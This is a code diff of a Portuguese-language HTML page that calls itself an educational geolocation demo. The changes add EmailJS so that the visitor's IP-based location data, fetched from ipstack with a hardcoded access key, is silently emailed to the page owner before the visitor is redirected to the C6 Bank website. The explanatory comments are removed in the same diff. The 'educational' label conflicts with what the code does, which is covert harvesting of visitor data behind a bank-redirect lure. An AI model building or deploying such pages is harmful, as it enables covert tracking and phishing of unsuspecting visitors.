@@ -4,27 +4,26 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Demonstração de Coleta de Dados</title>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
 </head>
 <body>
     <h1>Simulação de Coleta de Dados - Demonstração Educacional</h1>
     <p>Este é um projeto educacional para demonstrar como dados podem ser coletados de forma legítima com a API de geolocalização.</p>
     
-    <!-- Botão que inicia a coleta de dados -->
     <button id="collectDataBtn">Clique para ver seus dados de localização</button>
 
-    <!-- Onde exibiremos as informações de localização -->
     <div id="locationInfo" style="margin-top: 20px;"></div>
 
     <script>
+        // Inicialize o EmailJS com seu user ID
+        emailjs.init("YOUR_USER_ID");
+
         document.getElementById('collectDataBtn').addEventListener('click', function() {
-            // Alerta para que o usuário saiba que o processo é simulado
             alert('Você será redirecionado para um site legítimo após a coleta de dados.');
 
-            // Requisição à API ipstack para coletar dados de geolocalização
             fetch('https://api.ipstack.com/check?access_key=ad7c9124ed677ac38d96ed71a4c20998')
                 .then(response => response.json())
                 .then(data => {
-                    // Exibindo os dados coletados de forma educativa
                     const locationData = `
                         <p><strong>Informações Coletadas:</strong></p>
                         <ul>
@@ -36,13 +35,26 @@
                     `;
                     document.getElementById('locationInfo').innerHTML = locationData;
 
-                    // Após mostrar os dados, redireciona para o site legítimo
-                    setTimeout(() => {
+                    // Enviar os dados para o e-mail
+                    const emailParams = {
+                        to_email: "seu_email@dominio.com",
+                        subject: "Dados de Localização Coletados",
+                        message: `Os dados de localização são: ${JSON.stringify(data)}`
+                    };
+
+                    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", emailParams)
+                        .then(function(response) {
+                            console.log("Email enviado com sucesso!", response);
+                        }, function(error) {
+                            console.log("Erro ao enviar o e-mail", error);
+                        });
+
+                    // Após exibir os dados, redireciona para o C6 Bank
+                    setTimeout(function() {
                         window.location.href = "https://www.c6bank.com.br"; // Redireciona para o C6 Bank
-                    }, 3000); // Espera 3 segundos antes do redirecionamento
+                    }, 3000); // Aguarda 3 segundos antes do redirecionamento
                 })
                 .catch(error => {
-                    // Caso haja algum erro ao obter os dados
                     document.getElementById('locationInfo').innerHTML = "<p>Não foi possível obter sua localização.</p>";
                     console.error('Erro na API:', error);
                 });
